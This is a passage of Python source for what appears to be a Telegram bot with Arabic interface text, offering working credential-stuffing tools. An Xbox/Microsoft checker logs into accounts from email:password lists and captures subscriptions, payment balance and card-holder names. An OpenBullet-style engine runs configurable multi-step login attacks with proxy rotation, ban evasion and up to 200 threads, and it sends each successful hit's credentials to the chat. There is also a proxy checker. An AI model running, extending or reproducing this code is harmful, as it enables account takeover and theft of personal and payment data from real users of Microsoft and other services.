        hdrs = {
            "User-Agent":"Mozilla/5.0","Accept":"application/json",
            "Authorization":f'MSADELEGATE1.0="{payment_token}"',
            "Content-Type":"application/json","Host":"paymentinstruments.mp.microsoft.com",
            "Origin":"https://account.microsoft.com",
        }
        # Transactions for subscriptions
        r_tr = session.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
            headers={**hdrs,"Host":"paymentinstruments.mp.microsoft.com"}, timeout=12)
        tr_src = r_tr.text if r_tr.status_code == 200 else ""
        for kw in _XBOX_SUB_KEYWORDS:
            if kw.lower() in tr_src.lower():
                subs.append(kw)
                break
        # Payment instrument
        r_pi = session.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active&language=en-US",
            headers={**hdrs,"Host":"paymentinstruments.mp.microsoft.com"}, timeout=12)
        if r_pi.status_code == 200:
            pi_src = r_pi.text
            if '"accountHolderName":"' in pi_src:
                card_holder = pi_src.split('"accountHolderName":"')[1].split('"')[0]
            if '"balance":' in pi_src:
                try:
                    balance = "$" + pi_src.split('"balance":')[1].split(',')[0].split('}')[0].strip()
                except Exception:
                    pass
    except Exception:
        pass
    return subs, balance, card_holder

def run_xbox_checker(token, cid, lines):
    """Full Capture Xbox/Microsoft checker (standalone tool runner)."""
    total = len(lines)
    hits  = []
    twofa = []
    bad   = 0
    errors= 0
    checked = 0
    lock = threading.Lock()
    start_ts = time.time()
    stop_ev = get_stop_event(cid)
    prog_mid = _send_msg_id(token, cid,
        f"╔══════════════════════════════════╗\n║  🎮  <b>Xbox Full Capture</b>        ║\n"
        f"╠══════════════════════════════════╣\n║  📋 إجمالي : <b>{total}</b>\n"
        f"║  ⏳ جارٍ...\n╚══════════════════════════════════╝",
        reply_markup=_stop_markup())

    def check_one(line):
        nonlocal checked, bad, errors
        if stop_ev.is_set():
            return
        parts = line.strip().split(':',1)
        if len(parts) < 2:
            with lock:
                bad += 1; checked += 1
            return
        email, password = parts[0].strip(), parts[1].strip()
        try:
            session = requests.Session()
            post_url, ppft, referer = _xbox_get_oauth_params(session, email)
            if not post_url:
                with lock:
                    errors += 1; checked += 1
                return
            status, code = _xbox_login_post(session, email, password, post_url, ppft, referer)
            if status == "bad":
                with lock:
                    bad += 1; checked += 1
                return
            if status == "2fa":
                twofa.append(f"🔐 {email}:{password}")
                with lock:
                    checked += 1
                return
            if status == "error" or not code:
                with lock:
                    errors += 1; checked += 1
                return
            access_token = _xbox_exchange_token(session, code)
            if not access_token:
                with lock:
                    errors += 1; checked += 1
                return
            cid_upper = ""
            try:
                cid_upper = session.cookies.get("MSPCID","").upper()
            except Exception:
                pass
            name, country = _xbox_get_profile(session, access_token, cid_upper)
            payment_token = _xbox_get_payment_token(session)
            subs, balance, card_holder = _xbox_check_subs(session, payment_token)
            has_sub = len(subs) > 0
            sub_str = " | ".join(subs) if subs else "None"
            hit_line = (
                f"{'✅' if has_sub else '📁'} {email}:{password}"
                f" | Name:{name} | Country:{country}"
                f" | Sub:{sub_str} | Balance:{balance} | Card:{card_holder}"
            )
            with lock:
                checked += 1
                # Always save valid accounts regardless of subscription status
                hits.append(hit_line)
                icon = "🎮" if has_sub else "📁"
                send_message(token, cid,
                    f"{icon} <b>Xbox {'HIT' if has_sub else 'Valid'}!</b>\n"
                    f"📧 <code>{email}</code>\n🔑 <code>{password}</code>\n"
                    f"👤 {name} | 🌍 {country}\n"
                    f"🎮 Sub: <b>{sub_str}</b>\n"
                    f"💰 Balance: <b>{balance}</b>")
        except Exception:
            with lock:
                errors += 1; checked += 1

    ex = ThreadPoolExecutor(max_workers=15)
    futures = [ex.submit(check_one, l) for l in lines]
    last_upd = time.time()
    stopped = False
    for fut in as_completed(futures):
        if stop_ev.is_set():
            stopped = True
            ex.shutdown(wait=False)
            break
        if time.time() - last_upd > 4:
            last_upd = time.time()
            elapsed  = max(int(time.time()-start_ts),1)
            cpm      = int(checked/(elapsed/60))
            try:
                edit_message(token, cid, prog_mid,
                    f"╔══════════════════════════════════╗\n║  🎮  <b>Xbox Full Capture</b>        ║\n"
                    f"╠══════════════════════════════════╣\n║ ✅ هيتات   : <b>{len(hits)}</b>\n"
                    f"║ 🔐 2FA      : <b>{len(twofa)}</b>\n║ ❌ خاطئ    : <b>{bad}</b>\n"
                    f"║ ⚠️  خطأ     : <b>{errors}</b>\n║ 📋 تم      : <b>{checked}/{total}</b>\n"
                    f"║ ⚡ CPM     : <b>{cpm}</b>\n║ {_bar(checked,total)}\n"
                    f"╚══════════════════════════════════╝",
                    reply_markup=_stop_markup())
            except Exception:
                pass
    ex.shutdown(wait=False)
    if stopped:
        _stopped_msg(token, cid, prog_mid, hits+twofa, checked, total, "Xbox Full Capture")
        sess(cid)["state"] = "idle"
        return
    _send_checker_results(token, cid, hits+twofa, total, checked, bad, errors,
                          "Xbox Full Capture", "xbox_hits.txt")
    sess(cid)["state"] = "idle"


# ══════════════════════════════════════════════════════════════════════════════
# BROADCAST HELPER
# ══════════════════════════════════════════════════════════════════════════════

def run_broadcast(bot_token, admin_cid, text):
    def task():
        users  = get_cloud_list("users")
        groups = get_cloud_list("group")
        targets= list(set(users + groups))
        send_message(bot_token, admin_cid,
            f"📢 <b>بدأت الإذاعة إلى {len(targets)} هدف...</b>")
        ok_c = fail_c = 0
        for target in targets:
            time.sleep(0.05)
            res = send_message(bot_token, target, text)
            if res and res.get("ok"):
                ok_c += 1
            else:
                fail_c += 1
        send_message(bot_token, admin_cid,
            f"📢 <b>اكتملت الإذاعة!</b>\n"
            f"✅ نجح: <code>{ok_c}</code>\n❌ فشل: <code>{fail_c}</code>")
    threading.Thread(target=task, daemon=True).start()


# ══════════════════════════════════════════════════════════════════════════════
# SILVERBULLET / OPENBULLET ENGINE  v2.0
# ══════════════════════════════════════════════════════════════════════════════
#
# Full OpenBullet-compatible engine:
#  • Multi-step HTTP requests (cookie grab → login → profile)
#  • CPM (Checks Per Minute) live counter
#  • Smart proxy rotation with dead-proxy removal
#  • Retry on ban/error with fresh proxy
#  • Pause / Resume support
#  • Configurable thread count (1–200)
#  • Variable capture & chaining between steps
#  • Professional OpenBullet-style Telegram UI
#
# Config format v2 (JSON):
# {
#   "name":          "Netflix Config v2",
#   "author":        "@me",
#   "version":       "2.0",
#   "proxy_type":    "http",           # http | socks4 | socks5
#   "threads":       50,               # 1-200
#   "timeout":       15,
#   "retry_on_ban":  true,
#   "max_retries":   3,
#   "requests": [
#     {
#       "name":         "Step1 - Get CSRF",
#       "url":          "https://site.com/login",
#       "method":       "GET",
#       "headers":      {},
#       "success_keys": [],
#       "fail_keys":    [],
#       "ban_keys":     [],
#       "captures":     [{"name":"csrf","regex":"csrf_token\" value=\"([^\"]+)\""}]
#     },
#     {
#       "name":         "Step2 - Login",
#       "url":          "https://site.com/api/login",
#       "method":       "POST",
#       "content_type": "application/json",
#       "body":         "{\"email\":\"<USER>\",\"pass\":\"<PASS>\",\"token\":\"<csrf>\"}",
#       "success_keys": ["dashboard","access_token"],
#       "fail_keys":    ["invalid","incorrect"],
#       "ban_keys":     ["captcha","rate limit","blocked"],
#       "captures":     [{"name":"plan","regex":"\"plan\":\"([^\"]+)\""}]
#     }
#   ]
# }
#
# Legacy single-request format also supported (target + body at root level).
# ══════════════════════════════════════════════════════════════════════════════

import collections as _collections
import urllib3 as _urllib3
_urllib3.disable_warnings(_urllib3.exceptions.InsecureRequestWarning)

# ── Per-user state ────────────────────────────────────────────────────────────
_sb_configs:  dict = {}   # str(chat_id) -> [{"name":str,"config":dict}, ...]
_sb_proxies:  dict = {}   # str(chat_id) -> [proxy_str, ...]
_sb_sessions: dict = {}   # str(chat_id) -> SilverBulletRunner instance (running)
_sb_settings: dict = {}   # str(chat_id) -> {"threads":50, ...}

# ── Config normaliser ─────────────────────────────────────────────────────────

def _sb_parse_config(raw: str) -> tuple:
    """
    Parse a JSON config.  Returns (cfg_dict, None) or (None, error_str).
    Normalises both legacy (single-request) and v2 (multi-request) formats.
    """
    try:
        cfg = json.loads(raw)
    except Exception as e:
        return None, f"خطأ JSON: {e}"

    if not isinstance(cfg, dict):
        return None, "الكونفيغ يجب أن يكون JSON object {}"

    # ── Convert legacy single-request to multi-request format ───────────────
    if "requests" not in cfg:
        if "target" not in cfg:
            return None, "حقل target مطلوب (أو requests[])"
        if "success_keys" not in cfg:
            return None, "حقل success_keys مطلوب"
        step = {
            "name":         "Login",
            "url":          cfg["target"],
            "method":       cfg.get("method", "POST"),
            "content_type": cfg.get("content_type", "application/json"),
            "headers":      cfg.get("headers", {}),
            "body":         cfg.get("body", ""),
            "success_keys": cfg.get("success_keys", []),
            "fail_keys":    cfg.get("fail_keys", []),
            "ban_keys":     cfg.get("ban_keys", []),
            "captures":     cfg.get("captures", []),
        }
        cfg["requests"] = [step]

    if not cfg.get("requests"):
        return None, "requests[] فارغة"

    # ── Apply defaults ───────────────────────────────────────────────────────
    cfg.setdefault("name",        "Config")
    cfg.setdefault("author",      "")
    cfg.setdefault("proxy_type",  "http")
    cfg.setdefault("threads",     50)
    cfg.setdefault("timeout",     15)
    cfg.setdefault("retry_on_ban",True)
    cfg.setdefault("max_retries", 3)

    for step in cfg["requests"]:
        step.setdefault("method",       "POST")
        step.setdefault("content_type", "application/json")
        step.setdefault("headers",      {})
        step.setdefault("body",         "")
        step.setdefault("success_keys", [])
        step.setdefault("fail_keys",    [])
        step.setdefault("ban_keys",     [])
        step.setdefault("captures",     [])

    return cfg, None


# ── Helper: substitute all variables in a string ─────────────────────────────

def _sb_sub(s: str, user: str, password: str, caps: dict = None) -> str:
    """Replace <USER>, <PASS>, and captured variables."""
    for old, new in (("<USER>",user),("<PASS>",password),
                     ("<user>",user),("<pass>",password),
                     ("[USER]",user),("[PASS]",password),
                     ("%USER%",user),("%PASS%",password)):
        s = s.replace(old, new)
    if caps:
        for k, v in caps.items():
            s = s.replace(f"<{k}>", str(v)).replace(f"[{k}]", str(v))
    return s


# ── Helper: build requests-compatible proxy dict ──────────────────────────────

def _sb_proxy_dict(proxy_str: str, proxy_type: str) -> dict:
    s = proxy_str.strip()
    if s.startswith(("http://","https://","socks4://","socks5://")):
        return {"http": s, "https": s}
    parts = s.split(":")
    if len(parts) == 4:        # ip:port:user:pass
        url = f"{proxy_type}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:      # ip:port
        url = f"{proxy_type}://{s}"
    else:
        url = f"{proxy_type}://{s}"
    return {"http": url, "https": url}


# ── Proxy Checker ─────────────────────────────────────────────────────────────

_PROXY_TEST_URL = "http://httpbin.org/ip"   # fast, no TLS needed
_PROXY_TEST_TIMEOUT = 8

def _sb_check_proxy_single(proxy_str: str, proxy_type: str = "http") -> tuple:
    """
    Test one proxy. Returns (proxy_str, alive:bool, latency_ms:int).
    """
    try:
        pd = _sb_proxy_dict(proxy_str, proxy_type)
        t0 = time.time()
        r  = requests.get(_PROXY_TEST_URL, proxies=pd,
                          timeout=_PROXY_TEST_TIMEOUT, verify=False)
        ms = int((time.time() - t0) * 1000)
        if r.status_code == 200:
            return proxy_str, True, ms
        return proxy_str, False, 0
    except Exception:
        return proxy_str, False, 0


def run_proxy_checker(bot_token: str, chat_id, proxy_list: list,
                      proxy_type: str, progress_msg_id: int,
                      on_done=None):
    """
    Tests all proxies concurrently (100 threads), shows live progress,
    updates _sb_proxies[chat_id] with only live proxies when done.
    """
    total   = len(proxy_list)
    live    = []
    dead    = []
    checked = [0]
    lock    = threading.Lock()
    last_up = [0.0]
    start   = time.time()

    def _update(force=False):
        now = time.time()
        if not force and now - last_up[0] < 3.0:
            return
        last_up[0] = now
        tc  = checked[0]
        pct = tc / total * 100 if total else 0
        filled = int(pct / 100 * 20)
        bar  = "█" * filled + "░" * (20 - filled)
        elapsed = int(now - start)
        cpm_val = int(tc / max(elapsed, 1) * 60)
        msg = (
            f"╔══════════════════════════════╗\n"
            f"║  🌐 <b>Proxy Checker — جارٍ</b>      ║\n"
            f"╠══════════════════════════════╣\n"
            f"║  ✅ حي   │ <b>{len(live):>6,}</b>\n"
            f"║  ❌ ميت  │ <b>{len(dead):>6,}</b>\n"
            f"║  📋 تم   │ <b>{tc:>6,} / {total:,}</b>\n"
            f"╠══════════════════════════════╣\n"
            f"║  📊 [{bar}] {pct:.1f}%\n"
            f"║  ⚡ CPM  │ <b>{cpm_val:,}</b>\n"
            f"╚══════════════════════════════╝\n"
            f"💎 {MY_SIGNATURE}"
        )
        done = tc >= total
        edit_message(bot_token, chat_id, progress_msg_id, msg,
                     reply_markup=None if done else
                     {"inline_keyboard": [[{"text": "🛑 إيقاف",
                                             "callback_data": "stop_scan"}]]})

    def _worker(proxy):
        p, alive, ms = _sb_check_proxy_single(proxy, proxy_type)
        with lock:
            checked[0] += 1
            if alive:
                live.append((p, ms))
            else:
                dead.append(p)
        _update()

    def _run():
        with ThreadPoolExecutor(max_workers=100) as ex:
            list(ex.map(_worker, proxy_list))

        _update(force=True)

        # Sort live by latency (fastest first)
        live.sort(key=lambda x: x[1])
        live_proxies = [p for p, _ in live]

        # Save only live proxies back
        _sb_proxies[str(chat_id)] = live_proxies

        elapsed = int(time.time() - start)
        m, s = divmod(elapsed, 60)
        avg_ms = int(sum(ms for _, ms in live) / len(live)) if live else 0
        fastest = live[0][1] if live else 0

        summary = (
            f"✅ <b>اكتمل فحص البروكسيات!</b>\n\n"
            f"╔══════════════════════════════╗\n"
            f"║  🌐 <b>Proxy Checker — النتائج</b>  ║\n"
            f"╠══════════════════════════════╣\n"
            f"║  ✅ حي     │ <b>{len(live):,}</b>\n"
            f"║  ❌ ميت    │ <b>{len(dead):,}</b>\n"
            f"║  📋 مجموع  │ <b>{total:,}</b>\n"
            f"╠══════════════════════════════╣\n"
            f"║  ⚡ أسرع   │ <b>{fastest} ms</b>\n"
            f"║  📊 متوسط  │ <b>{avg_ms} ms</b>\n"
            f"║  ⏱️ وقت    │ {m}m {s}s\n"
            f"╠══════════════════════════════╣\n"
            f"║  💾 محفوظ  │ <b>{len(live_proxies):,} بروكسي حي</b>\n"
            f"╚══════════════════════════════╝\n"
            f"💎 {MY_SIGNATURE}"
        )
        send_message(bot_token, chat_id, summary)

        # Save live proxies file
        if live_proxies:
            os.makedirs(f"Results/{chat_id}", exist_ok=True)
            live_file = f"Results/{chat_id}/live_proxies_{int(time.time())}.txt"
            with open(live_file, "w", encoding="utf-8") as f:
                for p, ms in live:
                    f.write(f"{p}  # {ms}ms\n")
            send_document(bot_token, chat_id, live_file,
                          caption=(f"🌐 <b>البروكسيات الحية</b> — {len(live_proxies):,}\n"
                                   f"💎 {MY_SIGNATURE}"))

        if on_done:
            on_done()

    threading.Thread(target=_run, daemon=True, name=f"ProxyCheck_{chat_id}").start()


# ── Core: run one combo through all request steps ────────────────────────────

def _sb_run_combo(cfg: dict, user: str, password: str,
                  proxy_str: str, session_obj) -> tuple:
    """
    Execute all steps in cfg["requests"] for one credential pair.
    Returns (status, captures_dict, extra_info_str)
    status: 'hit' | 'bad' | 'ban' | 'error' | 'retry'
    """
    proxy_type = cfg.get("proxy_type", "http")
    timeout    = int(cfg.get("timeout", 15))
    proxies    = _sb_proxy_dict(proxy_str, proxy_type) if proxy_str else None

    # Shared captures across steps
    all_caps: dict = {}
    step_status = "bad"
    resp_text   = ""

    # Use a persistent session for cookie sharing between steps
    s = requests.Session()
    s.headers.update({
        "User-Agent": generate_user_agent(),
        "Accept":     "*/*",
        "Accept-Language": "en-US,en;q=0.9",
    })

    try:
        for step in cfg["requests"]:
            method  = step["method"].upper()
            url     = _sb_sub(step["url"], user, password, all_caps)
            ct      = step.get("content_type", "application/json")
            body_raw= _sb_sub(step.get("body",""), user, password, all_caps)

            # Build headers
            hdrs = {k: _sb_sub(v, user, password, all_caps)
                    for k, v in step.get("headers", {}).items()}
            if body_raw:
                hdrs["Content-Type"] = ct

            # Send request
            resp = None
            if method == "GET":
                resp = s.get(url, headers=hdrs, proxies=proxies,
                             timeout=timeout, verify=False, allow_redirects=True)
            elif method == "POST":
                if "json" in ct.lower():
                    try:
                        body_data = json.loads(body_raw) if body_raw else {}
                        resp = s.post(url, json=body_data, headers=hdrs,
                                      proxies=proxies, timeout=timeout,
                                      verify=False, allow_redirects=True)
                    except (json.JSONDecodeError, ValueError):
                        resp = s.post(url, data=body_raw, headers=hdrs,
                                      proxies=proxies, timeout=timeout,
                                      verify=False, allow_redirects=True)
                else:  # form-urlencoded
                    form = {}
                    for pair in body_raw.split("&"):
                        if "=" in pair:
                            k, v = pair.split("=", 1)
                            form[urllib.parse.unquote_plus(k)] = urllib.parse.unquote_plus(v)
                    resp = s.post(url, data=form if form else body_raw,
                                  headers=hdrs, proxies=proxies,
                                  timeout=timeout, verify=False, allow_redirects=True)
            elif method == "PUT":
                resp = s.put(url, data=body_raw, headers=hdrs,
                             proxies=proxies, timeout=timeout,
                             verify=False, allow_redirects=True)
            else:
                resp = s.request(method, url, data=body_raw, headers=hdrs,
                                 proxies=proxies, timeout=timeout,
                                 verify=False, allow_redirects=True)

            resp_text = ""
            try:
                resp_text = resp.text
            except Exception:
                resp_text = str(resp.content[:2000])

            # Extract captures from this step
            for cap in step.get("captures", []):
                try:
                    m = re.search(cap["regex"], resp_text, re.IGNORECASE | re.DOTALL)
                    all_caps[cap["name"]] = m.group(1) if m else "N/A"
                except Exception:
                    all_caps[cap["name"]] = "N/A"

            # Determine step result
            rt = resp_text.lower()

            # Ban check
            for bk in step.get("ban_keys", []):
                if bk.lower() in rt:
                    return "ban", all_caps, f"BAN: {bk[:30]}"

            # Success check
            hit = False
            for sk in step.get("success_keys", []):
                if sk.lower() in rt:
                    hit = True
                    break
            if not hit and resp.status_code in (200, 201, 202) and not step.get("success_keys"):
                # No success_keys defined on this step = treat as pass-through
                step_status = "pass"
                continue
            if hit:
                step_status = "hit"
                continue

            # Fail check
            for fk in step.get("fail_keys", []):
                if fk.lower() in rt:
                    return "bad", {}, f"FAIL: {fk[:30]}"

            # Status code check
            if resp.status_code in (401, 403):
                return "bad", {}, f"HTTP {resp.status_code}"
            if resp.status_code in (429, 503):
                return "ban", {}, f"HTTP {resp.status_code}"
            if resp.status_code >= 500:
                return "error", {}, f"HTTP {resp.status_code}"

            # Default: bad
            step_status = "bad"

        # All steps done — return overall status
        if step_status == "hit":
            return "hit", all_caps, ""
        return "bad", {}, ""

    except requests.exceptions.ProxyError as pe:
        return "error", {}, f"ProxyError: {str(pe)[:40]}"
    except requests.exceptions.Timeout:
        return "error", {}, "Timeout"
    except requests.exceptions.ConnectionError as ce:
        return "error", {}, f"ConnErr: {str(ce)[:40]}"
    except Exception as e:
        return "error", {}, f"Err: {str(e)[:50]}"
    finally:
        try:
            s.close()
        except Exception:
            pass


# ── SilverBulletRunner ────────────────────────────────────────────────────────

class SilverBulletRunner:
    """
    Full OpenBullet/SilverBullet engine.
    Features: CPM, threads, retry, dead-proxy removal, pause/resume.
    """

    def __init__(self, chat_id, bot_token, config: dict,
                 combo_lines: list, proxies: list, progress_msg_id: int,
                 threads: int = 50):
        self.chat_id         = int(chat_id)
        self.bot_token       = bot_token
        self.config          = config
        self.combo_lines     = [l.strip() for l in combo_lines if l.strip() and ":" in l]
        self.progress_msg_id = progress_msg_id
        self.threads         = max(1, min(200, threads))

        # Proxy management
        self._proxy_pool   = list(proxies)
        self._dead_proxies: set = set()
        self._proxy_idx    = 0
        self._proxy_lock   = threading.Lock()

        # Stats (atomic via lock)
        self._lock   = threading.Lock()
        self.total   = len(self.combo_lines)
        self.checked = 0
        self.hits    = 0
        self.bad     = 0
        self.ban     = 0
        self.errors  = 0
        self.retries = 0

        # CPM tracking — store timestamps of last 60s checks
        self._cpm_window: _collections.deque = _collections.deque()

        # Control
        self._pause_ev  = threading.Event()
        self._pause_ev.set()   # not paused initially
        self._stop_ev   = get_stop_event(self.chat_id)

        # Timing
        self._start_time  = time.time()
        self._last_update = 0.0

        # Results file
        self._results_dir = f"Results/{chat_id}"
        os.makedirs(self._results_dir, exist_ok=True)
        safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', config.get('name','Config'))[:30]
        self._results_file = (f"{self._results_dir}/"
                              f"SB_{safe_name}_{int(time.time())}.txt")
        with open(self._results_file, "w", encoding="utf-8") as f:
            f.write(
                f"╔══════════════════════════════════════════╗\n"
                f"║   SilverBullet / OpenBullet Results      ║\n"
                f"╠══════════════════════════════════════════╣\n"
                f"║  Config  : {config.get('name','?')[:35]}\n"
                f"║  Author  : {config.get('author','?')[:35]}\n"
                f"║  Target  : {config.get('requests',[{}])[0].get('url','?')[:35]}\n"
                f"║  Bot     : {MY_SIGNATURE}\n"
                f"╚══════════════════════════════════════════╝\n\n"
            )

        # Register in global sessions
        _sb_sessions[str(chat_id)] = self

    # ── Proxy rotation ────────────────────────────────────────────────────────

    def _get_proxy(self) -> str:
        with self._proxy_lock:
            live = [p for p in self._proxy_pool if p not in self._dead_proxies]
            if not live:
                return None
            p = live[self._proxy_idx % len(live)]
            self._proxy_idx += 1
            return p

    def _mark_dead(self, proxy: str):
        if proxy:
            with self._proxy_lock:
                self._dead_proxies.add(proxy)

    # ── CPM helper ────────────────────────────────────────────────────────────

    def _add_cpm_tick(self):
        now = time.time()
        with self._lock:
            self._cpm_window.append(now)
            # Remove entries older than 60 seconds
            while self._cpm_window and self._cpm_window[0] < now - 60:
                self._cpm_window.popleft()

    @property
    def cpm(self) -> int:
        with self._lock:
            now = time.time()
            elapsed = min(now - self._start_time, 60.0)
            if elapsed < 1:
                return 0
            return int(len(self._cpm_window) / elapsed * 60)

    # ── Check one combo line ──────────────────────────────────────────────────

    def _check_line(self, line: str):
        """Run one combo with retry logic."""
        if ":" not in line:
            with self._lock:
                self.bad += 1
                self.checked += 1
            return

        user, password = line.split(":", 1)
        user, password = user.strip(), password.strip()

        max_ret = int(self.config.get("max_retries", 3))
        retry_on_ban = bool(self.config.get("retry_on_ban", True))

        proxy = self._get_proxy()
        status = "error"
        captures = {}
        info = ""

        for attempt in range(max_ret + 1):
            # Pause check
            self._pause_ev.wait()
            if self._stop_ev.is_set():
                break

            status, captures, info = _sb_run_combo(
                self.config, user, password, proxy, self)

            if status == "hit":
                break
            if status == "bad":
                break
            if status == "ban":
                if not retry_on_ban:
                    break
                self._mark_dead(proxy)
                proxy = self._get_proxy()
                with self._lock:
                    self.retries += 1
                continue
            if status == "error":
                if "ProxyError" in info or "ConnErr" in info:
                    self._mark_dead(proxy)
                    proxy = self._get_proxy()
                with self._lock:
                    self.retries += 1
                if attempt < max_ret:
                    time.sleep(0.3)
                continue

        self._add_cpm_tick()

        with self._lock:
            self.checked += 1
            if status == "hit":
                self.hits += 1
                caps_str = "  ".join(f"{k}: {v}" for k, v in captures.items()) if captures else ""
                hit_line = f"{user}:{password}" + (f" | {caps_str}" if caps_str else "")
                with open(self._results_file, "a", encoding="utf-8") as f:
                    f.write(f"[HIT] {hit_line}\n")
                self._send_hit(user, password, captures)
            elif status == "bad":
                self.bad += 1
            elif status == "ban":
                self.ban += 1
            else:
                self.errors += 1

        self._update_progress()

    # ── Instant HIT notification ──────────────────────────────────────────────

    def _send_hit(self, user: str, password: str, captures: dict):
        cfg_name = self.config.get("name", "")
        target   = self.config.get("requests", [{}])[0].get("url", "")
        msg = (
            f"🎯 <b>[ SilverBullet ] — HIT!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔵 <b>Config :</b> {esc(cfg_name)}\n"
            f"🌐 <b>Target :</b> <code>{esc(target[:45])}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📧 <b>User   :</b> <code>{esc(user)}</code>\n"
            f"🔑 <b>Pass   :</b> <code>{esc(password)}</code>\n"
        )
        if captures:
            msg += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            for k, v in captures.items():
                if v and v != "N/A":
                    msg += f"📌 <b>{esc(k)}</b> → <code>{esc(str(v)[:60])}</code>\n"
        msg += f"━━━━━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}"
        send_message(self.bot_token, self.chat_id, msg)

    # ── Live progress panel ───────────────────────────────────────────────────

    def _update_progress(self, force: bool = False):
        now = time.time()
        if not force and (now - self._last_update < 3.5):
            return
        # Double-check under minimal lock
        with self._lock:
            if not force and (now - self._last_update < 3.5):
                return
            self._last_update = now
            tc   = self.checked
            to   = self.total
            h    = self.hits
            b    = self.bad
            bn   = self.ban
            e    = self.errors
            ret  = self.retries

        cpm_val = self.cpm
        pct     = (tc / to * 100) if to > 0 else 0
        elapsed = now - self._start_time

        # ETA
        eta_str = "—"
        if cpm_val > 0 and tc < to:
            eta_s = int((to - tc) / cpm_val * 60)
            h_e, r_e = divmod(eta_s, 3600)
            m_e, s_e = divmod(r_e, 60)
            eta_str = (f"{h_e}h {m_e}m" if h_e else f"{m_e}m {s_e}s")

        # Elapsed
        h_el, r_el = divmod(int(elapsed), 3600)
        m_el, s_el = divmod(r_el, 60)
        el_str = (f"{h_el}h {m_el}m {s_el}s" if h_el else f"{m_el}m {s_el}s")

        # Progress bar (20 chars)
        filled = int(pct / 100 * 20)
        bar = "█" * filled + "░" * (20 - filled)

        # Proxy info
        with self._proxy_lock:
            live_prx = len(self._proxy_pool) - len(self._dead_proxies)
            dead_prx = len(self._dead_proxies)
        prx_str = f"{live_prx:,} حي / {dead_prx} ميت" if self._proxy_pool else "بدون بروكسي"

        paused = not self._pause_ev.is_set()

        cfg_name = self.config.get("name", "Config")
        target   = self.config.get("requests", [{}])[0].get("url", "")
        steps    = len(self.config.get("requests", []))

        status_icon = "⏸️ موقوف مؤقتاً" if paused else "🔄 جارٍ الفحص..."

        msg = (
            f"╔══════════════════════════════╗\n"
            f"║  🔵 <b>SilverBullet Engine</b>       ║\n"
            f"╠══════════════════════════════╣\n"
            f"║  📋 <b>{esc(cfg_name[:22])}</b>\n"
            f"║  🌐 <code>{esc(target[:28])}</code>\n"
            f"║  🔢 خطوات: {steps} | ثريدات: {self.threads}\n"
            f"╠══════════════════════════════╣\n"
            f"║  ✅ هيتات  │ <b>{h:>6,}</b>\n"
            f"║  ❌ خاطئ   │ <b>{b:>6,}</b>\n"
            f"║  🚫 بان    │ <b>{bn:>6,}</b>\n"
            f"║  ⚠️ خطأ    │ <b>{e:>6,}</b>\n"
            f"║  🔁 إعادة  │ <b>{ret:>6,}</b>\n"
            f"╠══════════════════════════════╣\n"
            f"║  📊 [{bar}] {pct:.1f}%\n"
            f"║  📋 {tc:,} / {to:,}\n"
            f"║  ⚡ CPM    │ <b>{cpm_val:,}</b>\n"
            f"║  ⏱️ وقت   │ {el_str}\n"
            f"║  🕐 متبقي  │ {eta_str}\n"
            f"║  🌐 بروكسي │ {prx_str}\n"
            f"╠══════════════════════════════╣\n"
            f"║  {status_icon}\n"
            f"╚══════════════════════════════╝\n"
            f"💎 {MY_SIGNATURE}"
        )

        done = tc >= to
        if done:
            markup = None
        elif paused:
            markup = {"inline_keyboard": [
                [{"text": "▶️ استمرار", "callback_data": "sb_resume"},
                 {"text": "🛑 إيقاف",   "callback_data": "stop_scan"}],
            ]}
        else:
            markup = {"inline_keyboard": [
                [{"text": "⏸️ إيقاف مؤقت", "callback_data": "sb_pause"},
                 {"text": "🛑 إيقاف",      "callback_data": "stop_scan"}],
            ]}

        edit_message(self.bot_token, self.chat_id, self.progress_msg_id,
                     msg, reply_markup=markup)

    # ── Pause / Resume ────────────────────────────────────────────────────────

    def pause(self):
        self._pause_ev.clear()
        self._update_progress(force=True)

    def resume(self):
        self._pause_ev.set()
        self._update_progress(force=True)

    # ── Main scan loop ────────────────────────────────────────────────────────

    def start_scan(self):
        def run():
            try:
                with ThreadPoolExecutor(max_workers=self.threads) as ex:
                    futs = {}
                    for line in self.combo_lines:
                        if self._stop_ev.is_set():
                            break
                        # Throttle submission slightly to avoid memory overload
                        while len(futs) >= self.threads * 4:
                            done, _ = wait(list(futs.keys()),
                                           timeout=0.5, return_when=FIRST_COMPLETED)
                            for f in done:
                                futs.pop(f, None)
                        if self._stop_ev.is_set():
                            break
                        fut = ex.submit(self._check_line, line)
                        futs[fut] = True

                    for fut in as_completed(list(futs.keys())):
                        futs.pop(fut, None)
                        try:
                            fut.result()
                        except Exception:
                            pass
                        if self._stop_ev.is_set():
                            ex.shutdown(wait=False)
                            break

            except Exception as run_err:
                send_message(self.bot_token, self.chat_id,
                             f"❌ <b>خطأ في المحرك:</b> <code>{esc(str(run_err)[:100])}</code>")
            finally:
                self._update_progress(force=True)
                self._send_summary()
                _sb_sessions.pop(str(self.chat_id), None)

        threading.Thread(target=run, daemon=True, name=f"SB_{self.chat_id}").start()

    # ── Final summary ─────────────────────────────────────────────────────────

    def _send_summary(self):
        stopped  = self._stop_ev.is_set()
        elapsed  = time.time() - self._start_time
        h_el, r  = divmod(int(elapsed), 3600)
        m_el, s_el = divmod(r, 60)
        el_str   = (f"{h_el}h {m_el}m {s_el}s" if h_el else f"{m_el}m {s_el}s")
        avg_cpm  = int(self.checked / elapsed * 60) if elapsed > 1 else 0

        icon = "🛑" if stopped else "✅"
        summary = (
            f"{icon} <b>{'تم الإيقاف' if stopped else 'اكتمل الفحص!'}</b>\n\n"
            f"╔══════════════════════════════╗\n"
            f"║  🔵 <b>SilverBullet — النتائج</b>   ║\n"
            f"╠══════════════════════════════╣\n"
            f"║  📋 {esc(self.config.get('name','')[:26])}\n"
            f"╠══════════════════════════════╣\n"
            f"║  ✅ هيتات   │ <b>{self.hits:,}</b>\n"
            f"║  ❌ خاطئ    │ <b>{self.bad:,}</b>\n"
            f"║  🚫 بان     │ <b>{self.ban:,}</b>\n"
            f"║  ⚠️ خطأ     │ <b>{self.errors:,}</b>\n"
